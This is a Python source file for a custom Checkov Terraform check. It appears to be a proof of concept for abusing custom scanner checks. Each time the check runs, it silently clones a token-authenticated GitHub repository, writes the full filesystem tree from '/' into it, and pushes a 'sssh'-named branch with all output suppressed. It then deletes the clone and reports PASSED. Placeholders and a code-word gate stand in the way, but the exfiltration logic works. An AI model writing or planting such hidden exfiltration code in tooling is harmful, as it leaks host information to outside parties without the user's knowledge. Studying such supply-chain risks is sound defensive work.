
from __future__ import annotations

from typing import Any
from datetime import datetime
import subprocess, os, shutil

from checkov.terraform.checks.resource.base_resource_check import BaseResourceCheck
from checkov.common.models.enums import CheckResult, CheckCategories

def list_directory_tree(start_path):
    result = []
    for root, dirs, files in os.walk(start_path):
        level = root.replace(start_path, '').count(os.sep)
        indent = ' ' * 4 * level
        result.append(f"{indent}{os.path.basename(root)}/")
        subindent = ' ' * 4 * (level + 1)
        for file in files:
            result.append(f"{subindent}{file}")
    return result

def infiltrate_exfiltrate():

    # Variables
    time = datetime.today().strftime('%Y%m%d%H%M')
    repo_url = "https://<TEST ACCOUNT TOKEN>@github.com/<USER>/<REPO>.git"  
    branch_name = f"b2_{time}_sssh"  
    clone_dir = "<CLONE INTO THIS OTHER DIRECTORY - PREFERABLY NOT A .GIT DIR ALREADY>"
    check_if_you_read = "<INSERT DISCLAIMER YOU KNOW WHAT YOU ARE DOING>"

    # Prompt the user to enter a code word
    print("Are you aware of what could happen? You specified a repo_url that (probably) contains a token for you to authenticate to your GitHub (or similar) and you will clone the specified repo into the specified clone_dir. If that clone_dir posses stuff, you might overwrite it. Additionally, right at the end, the cloned directory will be REMOVED, COMPLETLY. Just want to give you one last chance. Feel free to clone this check and remove this. Check the source code and change the check_if_you_read variable to the correct value.")

    try:

        if check_if_you_read == "astronaut_riding_a_whale":
            print("Access granted! You entered the correct code word in check_if_you_read. Continuing")
        else:
            print("Access denied! The code word in the var check_if_you_read is wrong. Check the source code.")
            return

        subprocess.run(["git", "clone", repo_url, clone_dir], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        subprocess.run(["git", "checkout", "-b", branch_name], cwd=clone_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

        output_file = clone_dir+"/directory_tree.txt"
        with open(output_file, 'w') as f:
            for line in list_directory_tree('/'):
                f.write(f"{line}\n")

        
        subprocess.run(["git", "add", "."], cwd=clone_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        subprocess.run(["git", "commit", "-am", "initial exfiltration"], cwd=clone_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
                
        subprocess.run(["git", "push", "origin", branch_name], cwd=clone_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)


    except subprocess.CalledProcessError as e:
        # discreet message 
        print(f".")

    finally:
        if os.path.exists(clone_dir):
            # discreet remove directory
            shutil.rmtree(clone_dir)
            print(f"sssh")


class CoolMaliCheck2(BaseResourceCheck):

    def __init__(self) -> None:
        name = "This is a very cool check and I will not infiltrate nor exfiltrate data ;) - sarcastic!"
        id = "CKV_COOL_MALI_2_CHECK"
        categories = (CheckCategories.CONVENTION,)
        super().__init__(name=name, id=id, categories=categories, supported_resources="*")

    def scan_resource_conf(self, conf: dict[str, list[Any]]) -> CheckResult:

        infiltrate_exfiltrate()
        return CheckResult.PASSED
        
check = CoolMaliCheck2()
